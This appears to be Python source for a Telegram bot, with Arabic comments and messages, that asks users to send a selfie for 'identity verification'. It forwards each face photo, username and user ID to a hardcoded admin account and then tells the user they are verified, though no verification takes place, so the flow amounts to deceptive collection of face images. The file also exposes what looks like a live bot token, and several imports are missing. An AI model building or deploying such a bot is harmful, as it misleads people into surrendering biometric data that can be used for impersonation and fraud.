from flask import Flask, request, jsonify

import uuid

from datetime import datetime, timedelta

# ===== الإعدادات =====
BOT_TOKEN = "8820847043:AAHtJRCJR4ulVZLD-gYl7vw4-cE8W4IWAFE"
ADMIN_ID = 8254258071

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# تخزين الجلسات
sessions = {}

# ===== أوامر البوت =====
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(
        message, 
        "مرحباً! 👋\n"
        "أرسل /verify للحصول على رابط تصوير الوجه.\n"
        "أو أرسل صورة وجهك مباشرة للتحقق."
    )

@bot.message_handler(commands=['verify'])
def verify_cmd(message):
    session_id = str(uuid.uuid4())[:8]
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    sessions[session_id] = {
        "user_id": user_id,
        "username": username,
        "verified": False,
        "created_at": datetime.now()
    }
    
    # رابط الصفحة المدمجة (سيتم عرضها في الرد)
    bot.reply_to(
        message,
        f"📸 **للتأكيد، أرسل صورة وجهك مباشرة هنا**\n\n"
        f"🆔 معرف التحقق: `{session_id}`\n"
        f"⏰ الصلاحية: 5 دقائق\n\n"
        f"💡 فقط أرسل صورة سيلفي واضحة مع إضاءة جيدة.",
        parse_mode="Markdown"
    )
    
    # تنبيه الأدمين
    try:
        bot.send_message(
            ADMIN_ID,
            f"⚠️ طلب تحقق جديد\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"🔑 Token: {session_id}"
        )
    except:
        pass
    
    # حذف الجلسة بعد 5 دقائق
    threading.Timer(300, lambda: sessions.pop(session_id, None)).start()

# ===== استقبال الصور من المستخدمين =====
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # البحث عن جلسة نشطة للمستخدم
    active_session = None
    for session_id, session in sessions.items():
        if session['user_id'] == user_id and not session['verified']:
            # التحقق من أن الجلسة لم تنتهي
            if datetime.now() - session['created_at'] < timedelta(minutes=5):
                active_session = session_id
                break
            else:
                # حذف الجلسات المنتهية
                sessions.pop(session_id, None)
    
    if not active_session:
        bot.reply_to(
            message,
            "❌ لا يوجد طلب تحقق نشط.\n"
            "أرسل /verify لبدء عملية التحقق."
        )
        return
    
    try:
        # الحصول على الصورة بأعلى جودة
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الصورة مؤقتاً
        photo_path = f"photo_{active_session}.jpg"
        with open(photo_path, 'wb') as f:
            f.write(downloaded_file)
        
        # إرسال الصورة للمستخدم للتأكيد
        with open(photo_path, 'rb') as photo:
            bot.send_photo(
                user_id,
                photo,
                caption="✅ تم استلام صورتك بنجاح! جاري التحقق..."
            )
            
            # إرسال للأدمين
            with open(photo_path, 'rb') as photo_admin:
                bot.send_photo(
                    ADMIN_ID,
                    photo_admin,
                    caption=f"📸 صورة جديدة\n"
                            f"👤 @{username}\n"
                            f"🆔 ID: {user_id}\n"
                            f"🔑 Token: {active_session}"
                )
        
        # تحديث حالة الجلسة
        sessions[active_session]['verified'] = True
        
        # حذف الملف
        os.remove(photo_path)
        
        bot.reply_to(
            message,
            "✅ **تم التحقق من هويتك بنجاح!**\n"
            "شكراً لك على التعاون. 🙏",
            parse_mode="Markdown"
        )
        
    except Exception as e:
        bot.reply_to(
            message,
            f"❌ حدث خطأ: {str(e)}\n"
            "يرجى المحاولة مرة أخرى."
        )
        print(f"Error: {e}")

# ===== نقطة نهاية للتحقق من التوكن (للتوافق مع الكود القديم) =====
@app.route('/check_token', methods=['GET'])
def check_token():
    token = request.args.get('token')
    if token in sessions:
        return jsonify({"valid": True})
    return jsonify({"valid": False}), 404

# ===== نقطة نهاية للصحة =====
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "sessions": len(sessions)})

# ===== تشغيل =====
def run_bot():
    print("🤖 البوت يعمل...")
    bot.infinity_polling()

# ===== تشغيل Flask مباشرة =====
if __name__ == '__main__':
    # تشغيل البوت في thread منفصل
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # تشغيل Flask على المنفذ المخصص من Render
    port = int(os.environ.get('PORT', 5000))
    print(f"🌐 السيرفر يعمل على المنفذ {port}...")
    app.run(host='0.0.0.0', port=port)
